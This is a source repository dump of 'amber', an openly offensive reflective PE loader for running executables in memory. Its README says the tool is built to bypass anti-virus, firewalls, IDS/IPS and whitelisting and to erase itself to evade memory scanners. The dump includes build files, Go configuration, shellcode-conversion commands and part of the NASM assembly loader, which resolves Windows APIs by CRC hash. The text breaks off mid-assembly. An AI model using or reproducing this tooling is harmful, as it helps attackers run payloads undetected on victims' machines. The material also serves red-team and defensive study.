Project Path: arc_EgeBalci_amber_382se661

Source Tree:

```txt
arc_EgeBalci_amber_382se661
├── Dockerfile
├── LICENSE
├── Makefile
├── README.md
├── config
│   └── options.go
├── go.mod
├── go.sum
├── loader
│   ├── README.md
│   ├── crc32_api
│   ├── loader-x64
│   │   ├── amber_loader-x64-lite.bin
│   │   ├── build.sh
│   │   ├── inc
│   │   │   ├── calc_crc.asm
│   │   │   ├── get_module_by_crc.asm
│   │   │   ├── get_proc_by_crc.asm
│   │   │   ├── load_module.asm
│   │   │   ├── map_image.asm
│   │   │   ├── memcpy.asm
│   │   │   ├── protect_sections.asm
│   │   │   ├── relocate_image.asm
│   │   │   ├── resolve_imports.asm
│   │   │   └── run_tls_callbacks.asm
│   │   ├── loader-x64-lite.asm
│   │   ├── loader-x64.asm
│   │   └── stub.c
│   ├── loader-x86
│   │   ├── amber_loader-x86-lite.bin
│   │   ├── build.sh
│   │   ├── inc
│   │   │   ├── calc_crc.asm
│   │   │   ├── get_module_by_crc.asm
│   │   │   ├── get_proc_by_crc.asm
│   │   │   ├── load_module.asm
│   │   │   ├── map_image.asm
│   │   │   ├── memcpy.asm
│   │   │   ├── protect_sections.asm
│   │   │   ├── relocate_image.asm
│   │   │   ├── resolve_imports.asm
│   │   │   └── run_tls_callbacks.asm
│   │   ├── loader-x86-lite.asm
│   │   ├── loader-x86.asm
│   │   └── stub.c
│   ├── syscall-loader-x64
│   │   ├── build.sh
│   │   ├── inc
│   │   │   ├── calc_crc.asm
│   │   │   ├── get_module_by_crc.asm
│   │   │   ├── get_proc_by_crc.asm
│   │   │   ├── load_module.asm
│   │   │   ├── map_image.asm
│   │   │   ├── memcpy.asm
│   │   │   ├── protect_sections.asm
│   │   │   ├── relocate_image.asm
│   │   │   ├── resolve_imports.asm
│   │   │   └── run_tls_callbacks.asm
│   │   ├── stub.c
│   │   └── syscall-loader-x64.asm
│   └── syscall_api
├── main.go
├── pkg
│   ├── amber.go
│   └── static.go
├── stub
│   ├── Makefile
│   ├── Resource.rc
│   ├── amber.ico
│   └── stub.c
└── utils
    └── helpers.go

```

`Dockerfile`:

```
FROM golang:1.20 as builder

RUN apt-get update && apt-get -y install \
    build-essential \    
    cmake \
    g++-multilib \
    gcc-multilib \
    git \
    libcapstone-dev \
    python3 \
    time
WORKDIR /root/
RUN git clone https://github.com/EgeBalci/keystone
RUN mkdir keystone/build
WORKDIR /root/keystone/build

RUN ../make-lib.sh
RUN cmake -DCMAKE_BUILD_TYPE=Release -DBUILD_SHARED_LIBS=OFF -DLLVM_TARGETS_TO_BUILD="AArch64;X86" -G "Unix Makefiles" ..
RUN make -j8
RUN make install && ldconfig

# RUN mkdir /root/amber
WORKDIR /root
RUN git clone https://github.com/egebalci/amber
WORKDIR /root/amber
RUN go build -trimpath -buildvcs=false -ldflags="-extldflags=-static -s -w" -o /root/bin/amber  main.go

FROM scratch
COPY --from=builder /root/bin/amber /amber
ENTRYPOINT ["/amber"]

```

`LICENSE`:

```
MIT License

Copyright (c) 2017 Ege Balcı

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`Makefile`:

```
BUILD=go build
BUILD_FLAGS=-trimpath -buildvcs=false -ldflags="-extldflags=-static -s -w -X github.com/egebalci/amber/config.Version=$$(git log --pretty=format:'v1.0.%at-%h' -n 1)" 

default:
	${BUILD} ${BUILD_FLAGS} -o amber
```

`README.md`:

```md

<p align="center">
  <img src="./.github/img/banner.png">
  <br/>
  <a href="https://github.com/EgeBalci/amber">
    <img src="https://img.shields.io/badge/version-3.2.0-green.svg?style=flat-square">
  </a>
  <a href="https://goreportcard.com/report/github.com/egebalci/amber">
    <img src="https://goreportcard.com/badge/github.com/egebalci/amber?style=flat-square">
  </a>
  <a href="https://github.com/EgeBalci/amber/issues">
    <img src="https://img.shields.io/github/issues/egebalci/amber?style=flat-square&color=red">
  </a>
  <a href="https://raw.githubusercontent.com/EgeBalci/sgn/master/LICENSE">
    <img src="https://img.shields.io/github/license/egebalci/amber.svg?style=flat-square">
  </a>
  <a href="https://twitter.com/egeblc">
    <img src="https://img.shields.io/badge/twitter-@egeblc-55acee.svg?style=flat-square">
  </a>
</p>

# Inroduction

Amber is a position-independent(reflective) PE loader that enables in-memory execution of native PE files(EXE, DLL, SYS...). It enables stealthy in-memory payload deployment that can be used to bypass anti-virus, firewall, IDS, IPS products, and application white-listing mitigations. Reflective payloads generated by Amber can either be staged from a remote server or executed directly in memory much like a generic shellcode. By default, every generated payload is encoded using the new generation [SGN encoder](https://github.com/EgeBalci/sgn). Amber uses [CRC32_API](https://github.com/EgeBalci/crc32_api) and [IAT_API](https://github.com/EgeBalci/iat_api) for inconspicuously resolving the Windows API function addresses. After the PE file is loaded and executed in memory, the reflective payload is erased for evading memory scanners. 

# Installation
Pre-compiled binaries can be found under [releases](https://github.com/EgeBalci/amber/releases).

***Building From Source***

The only dependency for building the source is the [keystone engine](https://github.com/keystone-engine/keystone), follow [these](https://github.com/keystone-engine/keystone/blob/master/docs/COMPILE.md) instructions for installing the library. Once libkeystone is installed on the system, simply just go get it ツ

```
go install github.com/EgeBalci/amber@latest
```

***Docker Install***

[![Docker](http://dockeri.co/image/egee/amber)](https://hub.docker.com/r/egee/amber/)

```
docker pull egee/amber
docker run -it egee/amber
```

# Usage

<p align="center">
  <img src="./.github/img/usage.gif">
</p>

The following table lists switches supported by the amber.

<table border="1">
  <tr>
    <th>Switch</th>
    <th>Type</th>
    <th>Description</th>
  </tr>

  <tr>
    <td><strong>-f,--file</strong></td>
    <td><var>string</var></td>
    <td>Input PE file.</td>
  </tr>

  <tr>
    <td><strong>-o,--out</strong></td>
    <td><var>string</var></td>
    <td>Output binary payload file name.</td>
  </tr>

  <tr>
    <td><strong>-e</strong></td>
    <td><var>int</var></td>
    <td>Number of times to encode the generated reflective payload</td>
  </tr> 
  
  <tr>
    <td><strong>--iat</strong></td>
    <td><var>bool</var></td>
    <td>Use IAT API resolver block instead of CRC API resolver block</td>
  </tr>
  
  <tr>
    <td><strong>-l</strong></td>
    <td><var>int</var></td>
    <td>Maximum number of bytes for obfuscation (default 5)</td>
  </tr>  

  <tr>
    <td><strong>--sys</strong></td>
    <td><var>bool</var></td>
    <td>Perform raw syscalls. (only x64)</td>
  </tr>  

  <tr>
    <td><strong>--scrape</strong></td>
    <td><var>bool</var></td>
    <td>Scrape magic byte and DOS stub from PE.</td>
  </tr>  
  
</table>


**Example Usage**

- Generate reflective payload.
```
amber -f test.exe
```
- Generate reflective payload with IAT API resolver and encode the final payload 10 times.
```
amber -e 10 --iat -f test.exe
``` 

***Docker Usage***
```
docker run -it -v /tmp/:/tmp/ amber -f /tmp/file.exe
```

# Demo

- [NOPcon 2018 DEMO](https://www.youtube.com/watch?v=lCPdKSH6RMc)
- [Pentest.blog - Deploying Reflective PE Files With Metasploit](https://www.youtube.com/watch?v=3en0ftnjEpE)
- [Pentest.blog - Deploying Reflective Ransomware POC](https://www.youtube.com/watch?v=JVv_spX6D4U)
```

`config/options.go`:

```go
package config

import (
	"fmt"
	"os"

	"github.com/EgeBalci/amber/utils"
	"github.com/alecthomas/kong"
)

const Version = "3.2.0"

func HelpPrompt(options kong.HelpOptions, ctx *kong.Context) error {
	err := kong.DefaultHelpPrinter(options, ctx)
	if err != nil {
		return err
	}
	return nil
}

// Main config struct for parsing the TOML file
type Config struct {
	FileName         string `help:"Input PE file name." name:"file" short:"f"`
	OutputFile       string `help:"Output binary payload file name." name:"out" short:"o"`
	EncodeCount      int    `help:"Number of times to encode the generated reflective payload." name:"encode" short:"e" default:"1"`
	ObfuscationLimit int    `help:"Maximum number of bytes for encoder obfuscation." name:"obfuscate-limit" short:"l" default:"5"`
	UseIAT           bool   `help:"Use IAT API resolver block instead of CRC API resolver block." name:"iat"`
	UseSyscalls      bool   `help:"Perform raw syscalls. (only x64)" name:"sys"`
	ScrapePeHeaders  bool   `help:"Scrape magic byte and DOS stub from PE." name:"scrape"`
	// IgnoreIntegrity  bool   `help:"Ignore PE file integrity check errors." name:"ignore"`
	Verbose bool `help:"Verbose mode." name:"verbose" short:"v"`
	Version kong.VersionFlag
}

// ConfigureOptions accepts a flag set and augments it with agentgo-server
// specific flags. On success, an options structure is returned configured
// based on the selected flags.
func Parse() (*Config, error) {

	cfg := new(Config)
	parser, err := kong.New(
		cfg,
		kong.Help(HelpPrompt),
		kong.UsageOnError(),
		kong.Vars{"version": Version},
		kong.ConfigureHelp(kong.HelpOptions{
			Summary: true,
		}),
	)
	if err != nil {
		return nil, err
	}
	_, err = parser.Parse(os.Args[1:])
	if err != nil {
		return nil, err
	}

	if cfg.FileName == "" {
		utils.PrintErr("no file specified! (-f <empty>)\n")
		kong.Help(HelpPrompt)
		os.Exit(1)
	}

	if cfg.OutputFile == "" {
		cfg.OutputFile = fmt.Sprintf("%s.bin", cfg.FileName)
	}

	return cfg, nil
}

func (cfg *Config) PrintSummary() {
	utils.PrintStatus("File: %s\n", cfg.FileName)
	utils.PrintStatus("Encode Count: %d\n", cfg.EncodeCount)
	utils.PrintStatus("Obfuscation Limit: %d\n", cfg.ObfuscationLimit)
	if cfg.UseIAT {
		utils.PrintStatus("API Resolver: IAT\n")
	} else {
		utils.PrintStatus("API Resolver: CRC\n")
	}
	if cfg.UseSyscalls {
		utils.PrintStatus("Raw Syscalls: True\n")
	}
}

```

`go.mod`:

```mod
module github.com/EgeBalci/amber

go 1.15

require (
	github.com/EgeBalci/debug v0.0.0-20201116162432-d79a6eb18848
	github.com/EgeBalci/sgn v0.0.0-20231219142414-258f3083dba2
	github.com/alecthomas/kong v0.8.1
	github.com/briandowns/spinner v1.23.0
	github.com/fatih/color v1.16.0
	github.com/mattn/go-runewidth v0.0.15 // indirect
	github.com/olekukonko/tablewriter v0.0.5 // indirect
	github.com/rivo/uniseg v0.4.7 // indirect
	github.com/sirupsen/logrus v1.9.0
	golang.org/x/sys v0.17.0 // indirect
	golang.org/x/term v0.17.0 // indirect
)

```

`go.sum`:

```sum
github.com/EgeBalci/debug v0.0.0-20201116162432-d79a6eb18848 h1:xp+mcTlDdvF6gCe/eSkaDmpQ4Kd7zUAPLZxPfqNjvWA=
github.com/EgeBalci/debug v0.0.0-20201116162432-d79a6eb18848/go.mod h1:7fXlZBJFFub/8MYzeBI6HFwNkwL2cw8pe3yrWTJduwc=
github.com/EgeBalci/keystone-go v0.0.0-20200525180613-e6c7cd32ceae h1:IMOEVXYMrzHg+1oWgTYBEwzMGsxFHUgoreu2Ic62K7Q=
github.com/EgeBalci/keystone-go v0.0.0-20200525180613-e6c7cd32ceae/go.mod h1:/HCfOmUN3INldcXC0YnFrOtOw3MuRFEQ9cKTT5fZuQ8=
github.com/EgeBalci/sgn v0.0.0-20201126033925-686e60d127dc h1:OVYO6tY6ivMDvT/np+bKnkUSIgHRJ4S7hAGcd1ylas8=
github.com/EgeBalci/sgn v0.0.0-20201126033925-686e60d127dc/go.mod h1:gI4nYEhbKmf35Q+NPyoX+o1ajkCgabjYjsyu19tmfgM=
github.com/EgeBalci/sgn v0.0.0-20231219142414-258f3083dba2 h1:v0YrXqe3w4KGVUH5D/MxBhIQH16nZ5yBZ+zTC8KI2Nk=
github.com/EgeBalci/sgn v0.0.0-20231219142414-258f3083dba2/go.mod h1:NROZGYB3DOyRBNWm7joLs64Zdu3MOBybtmxepm/D2Tc=
github.com/alecthomas/assert/v2 v2.1.0 h1:tbredtNcQnoSd3QBhQWI7QZ3XHOVkw1Moklp2ojoH/0=
github.com/alecthomas/assert/v2 v2.1.0/go.mod h1:b/+1DI2Q6NckYi+3mXyH3wFb8qG37K/DuK80n7WefXA=
github.com/alecthomas/kong v0.7.1 h1:azoTh0IOfwlAX3qN9sHWTxACE2oV8Bg2gAwBsMwDQY4=
github.com/alecthomas/kong v0.7.1/go.mod h1:n1iCIO2xS46oE8ZfYCNDqdR0b0wZNrXAIAqro/2132U=
github.com/alecthomas/kong v0.8.1 h1:acZdn3m4lLRobeh3Zi2S2EpnXTd1mOL6U7xVml+vfkY=
github.com/alecthomas/kong v0.8.1/go.mod h1:n1iCIO2xS46oE8ZfYCNDqdR0b0wZNrXAIAqro/2132U=
github.com/alecthomas/repr v0.1.0 h1:ENn2e1+J3k09gyj2shc0dHr/yjaWSHRlrJ4DPMevDqE=
github.com/alecthomas/repr v0.1.0/go.mod h1:2kn6fqh/zIyPLmm3ugklbEi5hg5wS435eygvNfaDQL8=
github.com/briandowns/spinner v1.11.1 h1:OixPqDEcX3juo5AjQZAnFPbeUA0jvkp2qzB5gOZJ/L0=
github.com/briandowns/spinner v1.11.1/go.mod h1:QOuQk7x+EaDASo80FEXwlwiA+j/PPIcX3FScO+3/ZPQ=
github.com/briandowns/spinner v1.23.0 h1:alDF2guRWqa/FOZZYWjlMIx2L6H0wyewPxo/CH4Pt2A=
github.com/briandowns/spinner v1.23.0/go.mod h1:rPG4gmXeN3wQV/TsAY4w8lPdIM6RX3yqeBQJSrbXjuE=
github.com/coreos/go-systemd/v22 v22.5.0/go.mod h1:Y58oyj3AT4RCenI/lSvhwexgC+NSVTIJ3seZv2GcEnc=
github.com/davecgh/go-spew v1.1.0/go.mod h1:J7Y8YcW2NihsgmVo/mv3lAwl/skON4iLHjSsI+c5H38=
github.com/davecgh/go-spew v1.1.1 h1:vj9j/u1bqnvCEfJOwUhtlOARqs3+rkHYY13jYWTU97c=
github.com/davecgh/go-spew v1.1.1/go.mod h1:J7Y8YcW2NihsgmVo/mv3lAwl/skON4iLHjSsI+c5H38=
github.com/fatih/color v1.7.0/go.mod h1:Zm6kSWBoL9eyXnKyktHP6abPY2pDugNf5KwzbycvMj4=
github.com/fatih/color v1.10.0 h1:s36xzo75JdqLaaWoiEHk767eHiwo0598uUxyfiPkDsg=
github.com/fatih/color v1.10.0/go.mod h1:ELkj/draVOlAH/xkhN6mQ50Qd0MPOk5AAr3maGEBuJM=
github.com/fatih/color v1.16.0 h1:zmkK9Ngbjj+K0yRhTVONQh1p/HknKYSlNT+vZCzyokM=
github.com/fatih/color v1.16.0/go.mod h1:fL2Sau1YI5c0pdGEVCbKQbLXB6edEj1ZgiY4NijnWvE=
github.com/godbus/dbus/v5 v5.0.4/go.mod h1:xhWf0FNVPg57R7Z0UbKHbJfkEywrmjJnf7w5xrFpKfA=
github.com/hexops/gotextdiff v1.0.3 h1:gitA9+qJrrTCsiCl7+kh75nPqQt1cx4ZkudSTLoUqJM=
github.com/hexops/gotextdiff v1.0.3/go.mod h1:pSWU5MAI3yDq+fZBTazCSJysOMbxWL1BSow5/V2vxeg=
github.com/mattn/go-colorable v0.1.2/go.mod h1:U0ppj6V5qS13XJ6of8GYAs25YV2eR4EVcfRqFIhoBtE=
github.com/mattn/go-colorable v0.1.8 h1:c1ghPdyEDarC70ftn0y+A/Ee++9zz8ljHG1b13eJ0s8=
github.com/mattn/go-colorable v0.1.8/go.mod h1:u6P/XSegPjTcexA+o6vUJrdnUu04hMope9wVRipJSqc=
github.com/mattn/go-colorable v0.1.13 h1:fFA4WZxdEF4tXPZVKMLwD8oUnCTTo08duU7wxecdEvA=
github.com/mattn/go-colorable v0.1.13/go.mod h1:7S9/ev0klgBDR4GtXTXX8a3vIGJpMovkB8vQcUbaXHg=
github.com/mattn/go-isatty v0.0.8/go.mod h1:Iq45c/XA43vh69/j3iqttzPXn0bhXyGjM0Hdxcsrc5s=
github.com/mattn/go-isatty v0.0.12 h1:wuysRhFDzyxgEmMf5xjvJ2M9dZoWAXNNr5LSBS7uHXY=
github.com/mattn/go-isatty v0.0.12/go.mod h1:cbi8OIDigv2wuxKPP5vlRcQ1OAZbq2CE4Kysco4FUpU=
github.com/mattn/go-isatty v0.0.16/go.mod h1:kYGgaQfpe5nmfYZH+SKPsOc2e4SrIfOl2e/yFXSvRLM=
github.com/mattn/go-isatty v0.0.19/go.mod h1:W+V8PltTTMOvKvAeJH7IuucS94S2C6jfK/D7dTCTo3Y=
github.com/mattn/go-isatty v0.0.20 h1:xfD0iDuEKnDkl03q4limB+vH+GxLEtL/jb4xVJSWWEY=
github.com/mattn/go-isatty v0.0.20/go.mod h1:W+V8PltTTMOvKvAeJH7IuucS94S2C6jfK/D7dTCTo3Y=
github.com/mattn/go-runewidth v0.0.7 h1:Ei8KR0497xHyKJPAv59M1dkC+rOZCMBJ+t3fZ+twI54=
github.com/mattn/go-runewidth v0.0.7/go.mod h1:H031xJmbD/WCDINGzjvQ9THkh0rPKHF+m2gUSrubnMI=
github.com/mattn/go-runewidth v0.0.9/go.mod h1:H031xJmbD/WCDINGzjvQ9THkh0rPKHF+m2gUSrubnMI=
github.com/mattn/go-runewidth v0.0.15 h1:UNAjwbU9l54TA3KzvqLGxwWjHmMgBUVhBiTjelZgg3U=
github.com/mattn/go-runewidth v0.0.15/go.mod h1:Jdepj2loyihRzMpdS35Xk/zdY8IAYHsh153qUoGf23w=
github.com/olekukonko/tablewriter v0.0.4 h1:vHD/YYe1Wolo78koG299f7V/VAS08c6IpCLn+Ejf/w8=
github.com/olekukonko/tablewriter v0.0.4/go.mod h1:zq6QwlOf5SlnkVbMSr5EoBv3636FWnp+qbPhuoO21uA=
github.com/olekukonko/tablewriter v0.0.5 h1:P2Ga83D34wi1o9J6Wh1mRuqd4mF/x/lgBS7N7AbDhec=
github.com/olekukonko/tablewriter v0.0.5/go.mod h1:hPp6KlRPjbx+hW8ykQs1w3UBbZlj6HuIJcUGPhkA7kY=
github.com/pkg/errors v0.9.1/go.mod h1:bwawxfHBFNV+L2hUp1rHADufV3IMtnDRdf1r5NINEl0=
github.com/pmezard/go-difflib v1.0.0 h1:4DBwDE0NGyQoBHbLQYPwSUPoCMWR5BEzIk/f1lZbAQM=
github.com/pmezard/go-difflib v1.0.0/go.mod h1:iKH77koFhYxTK1pcRnkKkqfTogsbg7gZNVY4sRDYZ/4=
github.com/rivo/uniseg v0.2.0/go.mod h1:J6wj4VEh+S6ZtnVlnTBMWIodfgj8LQOQFoIToxlJtxc=
github.com/rivo/uniseg v0.4.7 h1:WUdvkW8uEhrYfLC4ZzdpI2ztxP1I582+49Oc5Mq64VQ=
github.com/rivo/uniseg v0.4.7/go.mod h1:FN3SvrM+Zdj16jyLfmOkMNblXMcoc8DfTHruCPUcx88=
github.com/rs/xid v1.5.0/go.mod h1:trrq9SKmegXys3aeAKXMUTdJsYXVwGY3RLcfgqegfbg=
github.com/rs/zerolog v1.31.0/go.mod h1:/7mN4D5sKwJLZQ2b/znpjC3/GQWY/xaDXUM0kKWRHss=
github.com/sirupsen/logrus v1.9.0 h1:trlNQbNUG3OdDrDil03MCb1H2o9nJ1x4/5LYw7byDE0=
github.com/sirupsen/logrus v1.9.0/go.mod h1:naHLuLoDiP4jHNo9R0sCBMtWGeIprob74mVsIT4qYEQ=
github.com/stretchr/objx v0.1.0/go.mod h1:HFkY916IF+rwdDfMAkV7OtwuqBVzrE8GR6GFx+wExME=
github.com/stretchr/testify v1.7.0 h1:nwc3DEeHmmLAfoZucVR881uASk0Mfjw8xYJ99tb5CcY=
github.com/stretchr/testify v1.7.0/go.mod h1:6Fq8oRcR53rry900zMqJjRRixrwX3KX962/h/Wwjteg=
golang.org/x/sys v0.0.0-20190222072716-a9d3bda3a223/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS+E42TnysNCUPdjciGhY=
golang.org/x/sys v0.0.0-20200116001909-b77594299b42/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
golang.org/x/sys v0.0.0-20200223170610-d5e6a3e2c0ae/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
golang.org/x/sys v0.0.0-20210615035016-665e8c7367d1/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=
golang.org/x/sys v0.0.0-20220715151400-c0bba94af5f8/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=
golang.org/x/sys v0.0.0-20220811171246-fbc7d0a398ab/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=
golang.org/x/sys v0.6.0/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=
golang.org/x/sys v0.7.0 h1:3jlCCIQZPdOYu1h8BkNvLz8Kgwtae2cagcG/VamtZRU=
golang.org/x/sys v0.7.0/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=
golang.org/x/sys v0.12.0/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=
golang.org/x/sys v0.14.0/go.mod h1:/VUhepiaJMQUp4+oa/7Zr1D23ma6VTLIYjOOTFZPUcA=
golang.org/x/sys v0.15.0/go.mod h1:/VUhepiaJMQUp4+oa/7Zr1D23ma6VTLIYjOOTFZPUcA=
golang.org/x/sys v0.17.0 h1:25cE3gD+tdBA7lp7QfhuV+rJiE9YXTcS3VG1SqssI/Y=
golang.org/x/sys v0.17.0/go.mod h1:/VUhepiaJMQUp4+oa/7Zr1D23ma6VTLIYjOOTFZPUcA=
golang.org/x/term v0.1.0/go.mod h1:jbD1KX2456YbFQfuXm/mYQcufACuNUgVhRMnK/tPxf8=
golang.org/x/term v0.17.0 h1:mkTF7LCd6WGJNL3K1Ad7kwxNfYAW6a8a8QqtMblp/4U=
golang.org/x/term v0.17.0/go.mod h1:lLRBjIVuehSbZlaOtGMbcMncT+aqLLLmKrsjNrUguwk=
gopkg.in/check.v1 v0.0.0-20161208181325-20d25e280405 h1:yhCVgyC4o1eVCa2tZl7eS0r+SDo693bJlVdllGtEeKM=
gopkg.in/check.v1 v0.0.0-20161208181325-20d25e280405/go.mod h1:Co6ibVJAznAaIkqp8huTwlJQCZ016jof/cbN4VW5Yz0=
gopkg.in/yaml.v3 v3.0.0-20200313102051-9f266ea9e77c h1:dUUwHk2QECo/6vqA44rthZ8ie2QXMNeKRTHCNY2nXvo=
gopkg.in/yaml.v3 v3.0.0-20200313102051-9f266ea9e77c/go.mod h1:K4uyk7z7BCEPqu6E+C64Yfv1cQ7kz7rIZviUmN+EgEM=

```

`loader/README.md`:

```md
# Amber Loader v3.0

Amber Loader is a reflective PE loader designed for manually loading (mapping, relocating, and resolving) and executing PE files from memory. It is written fully in assembly using the NASM syntax. The loader supports both 32- and 64-bit PE files with TLS callbacks and forwarded imports.


<p align="center">
  <img src="../.github/img/loader.png">
</p>

The lite version of the amber loader can be directly appended in front of a PE file for converting the file into a shellcode. 


- [amber_loader-x86-lite.bin](https://github.com/EgeBalci/amber/raw/master/loader/loader-x86/amber_loader-x86-lite.bin)
- [amber_loader-x64-lite.bin](https://github.com/EgeBalci/amber/raw/master/loader/loader-x64/amber_loader-x64-lite.bin)

### Example: Converting putty.exe into shellcode
```bash
wget https://github.com/EgeBalci/amber/raw/master/loader/loader-x64/amber_loader-x64-lite.bin -O shellcode
cat putty.exe >> shellcode && xxd -i shellcode
```
**(!! lite version do not wipe itself from the memory !!)**
```

`loader/loader-x64/build.sh`:

```sh
#!/bin/bash
## ANSI Colors (FG & BG)
RED="$(printf '\033[31m')" GREEN="$(printf '\033[32m')" YELLOW="$(printf '\033[33m')" BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[36m')" WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')" GREENBG="$(printf '\033[42m')" YELLOWBG="$(printf '\033[43m')" BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')" CYANBG="$(printf '\033[46m')" WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESET="$(printf '\e[0m')"

print_warning() {
  echo ${YELLOW}"[!] ${RESET}${1}"
}
print_error() {
  echo "${RED}[-] ${RESET}${1}"
}
print_fatal() {
  echo -e ${RED}"[!] $1\n${RESET}"
  kill -10 $$
}
print_good() {
  echo "${GREEN}[+] ${RESET}${1}"
}
print_status() {
    echo "${YELLOW}[*] ${RESET}${1}"
}

nasm -f bin loader-x64.asm -o shellcode || print_fatal "nasm failed!"
print_status "Payload Size: `wc -c shellcode|cut -d' ' -f1`"
[[ -f shellcode ]] && xxd -i shellcode shellcode.h

x86_64-w64-mingw32-gcc stub.c -o test.exe || print_fatal "Compilation failed!"
cp test.exe /tmp/
rm shellcode shellcode.h
print_good "Build done!" 

```

`loader/loader-x64/inc/calc_crc.asm`:

```asm
[BITS 64]


calc_crc:
	test   dx,dx
	je     loc_1400039c9 
	mov    r8,rcx
	movzx  edx,dx
	lea    eax,[rdx-0x1]
	lea    rdx,[rcx+rax*1+0x1]
	mov    eax,0x0
loc_1400039b8:
	crc32  eax,BYTE [r8]
	add    r8,0x1
	cmp    r8,rdx
	jne    loc_1400039b8 
	jmp    loc_1400039ea 
loc_1400039c9:
	movzx  edx,BYTE [rcx]
	test   dl,dl
	je     loc_1400039eb 
	add    rcx,0x1
	mov    eax,0x0
loc_1400039d9:
	crc32  eax,dl
	add    rcx,0x1
	movzx  edx,BYTE [rcx-0x1]
	test   dl,dl
	jne    loc_1400039d9 
loc_1400039ea:
	ret
loc_1400039eb:
	mov    eax,0x0
	jmp    loc_1400039ea
```

`loader/loader-x64/inc/get_module_by_crc.asm`:

```asm
[BITS 64]


get_module_by_crc:
	push   rdi
	push   rsi
	push   rbx
	sub    rsp,0x20
	mov    esi,ecx
	mov    rax,QWORD gs:0x60
	mov    rax,QWORD [rax+0x18]
	lea    rdi,[rax+0x20]
	mov    rbx,QWORD [rax+0x20]
	cmp    rdi,rbx
	je     loc_140102e89 
loc_140102e5d:
	movzx  edx,WORD [rbx+0x48]
	mov    rcx,QWORD [rbx+0x50]
	call   calc_crc
	cmp    eax,esi
	je     loc_140102e7d 
	mov    rbx,QWORD [rbx]
	cmp    rdi,rbx
	jne    loc_140102e5d 
	mov    eax,0x0
	jmp    loc_140102e81 
loc_140102e7d:
	mov    rax,QWORD [rbx+0x20]
loc_140102e81:
	add    rsp,0x20
	pop    rbx
	pop    rsi
	pop    rdi
	ret
loc_140102e89:
	mov    eax,0x0
	jmp    loc_140102e81 

```

`loader/loader-x64/inc/get_proc_by_crc.asm`:

```asm
[BITS 64]


get_proc_by_crc:
	push   r15
	push   r14
	push   r13
	push   r12
	push   rbp
	push   rdi
	push   rsi
	push   rbx
	sub    rsp,0x258
	mov    rbx,rcx
	mov    r13d,edx
	mov    ebp,r8d
	movsxd rax,DWORD [rcx+0x3c]
	add    rax,rcx
	mov    esi,DWORD [rax+0x88]
	add    rsi,rcx
	mov    eax,DWORD [rax+0x8c]
	mov    DWORD [rsp+0x2c],eax
	mov    r12d,DWORD [rsi+0x20]
	mov    r14d,DWORD [rsi+0x1c]
	mov    r15d,DWORD [rsi+0x24]
	mov    eax,DWORD [rsi+0x18]
	test   eax,eax
	je     loc_140003764 
	mov    eax,eax
	mov    QWORD [rsp+0x20],rax
	mov    edi,0x0
	add    r12,rcx
loc_1400035dc:
	mov    ecx,DWORD [r12+rdi*4]
	add    rcx,rbx
	mov    edx,0x0
	call   calc_crc
	cmp    ebp,edi
	je     loc_14000360b 
	cmp    eax,r13d
	je     loc_14000360b 
	add    rdi,0x1
	cmp    QWORD [rsp+0x20],rdi
	jne    loc_1400035dc 
	mov    eax,0x0
	jmp    loc_140003738 
loc_14000360b:
	lea    rax,[rbx+rdi*2]
	movzx  eax,WORD [rax+r15*1]
	lea    rax,[rbx+rax*4]
	mov    eax,DWORD [rax+r14*1]
	add    rbx,rax
	cmp    rbx,rsi
	jb     loc_140003735 
	mov    eax,DWORD [rsp+0x2c]
	add    rsi,rax
	cmp    rbx,rsi
	jae    loc_140003735 
	mov    QWORD [rsp+0x30],0x0
	mov    QWORD [rsp+0x38],0x0
	lea    rdi,[rsp+0x40]
	mov    eax,0x0
	mov    ecx,0x1e
	rep stosq
	mov    DWORD [rdi],0x0
	mov    QWORD [rsp+0x140],0x0
	mov    QWORD [rsp+0x148],0x0
	lea    rdi,[rsp+0x150]
	mov    ecx,0x1e
	rep stosq
	mov    DWORD [rdi],0x0
	cmp    BYTE [rbx],0x2e
	je     loc_14000374c 
	mov    eax,0x1
loc_14000369e:
	mov    r8,rax
	add    rax,0x1
	cmp    BYTE [rbx+rax*1-0x1],0x2e
	jne    loc_14000369e 
	mov    esi,r8d
loc_1400036af:
	lea    rcx,[rsp+0x30]
	mov    rdx,rbx
	call   memcpy
	lea    ecx,[rsi+0x1]
	movsxd rcx,ecx
	add    rcx,rbx
	cmp    BYTE [rcx],0x0
	je     loc_14000375c 
	mov    eax,0x1
	movsxd rdx,esi
	add    rdx,rbx
loc_1400036d9:
	mov    r8,rax
	add    rax,0x1
	cmp    BYTE [rdx+rax*1],0x0
	jne    loc_1400036d9 
loc_1400036e6:
